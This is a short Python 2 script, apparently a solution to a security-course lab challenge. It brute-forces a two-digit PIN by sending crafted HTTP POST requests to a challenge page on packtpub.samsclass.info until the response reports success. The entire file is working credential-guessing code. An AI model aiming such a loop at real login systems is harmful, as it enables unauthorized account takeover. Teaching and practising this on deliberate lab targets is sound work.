import socket
s = socket.socket()
s.settimeout(2)

target = 'packtpub.samsclass.info'
s.connect((target, 80))

username = raw_input("Username: ")

req1 = """POST /http/chal1.php HTTP/1.1
Host: packtpub.samsclass.info
Connection: keep-alive
Content-Length: """

req2 = """
Cache-Control: max-age=0
Origin: http://packtpub.samsclass.info
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://packtpub.samsclass.info/http/chal1.htm
Accept-Language: en-US,en;q=0.8
Cookie: __cfduid=d0c8bfbe82592fd58def38a7716a9548c1498006119

"""
winner = ''

for p in range(100, 200):
   ps = str(p)
   pin = ps[1:]
   length = len(username) + len(pin) + 5

   req = req1 + str(length) + req2 + "u=" + username + "&p=" + pin

   print 'Trying ', username, pin
   s.send(req)

   r = s.recv(1024)
   if r.find("Success") >= 0:
      print "******** WINNER!", r
      break
s.close()

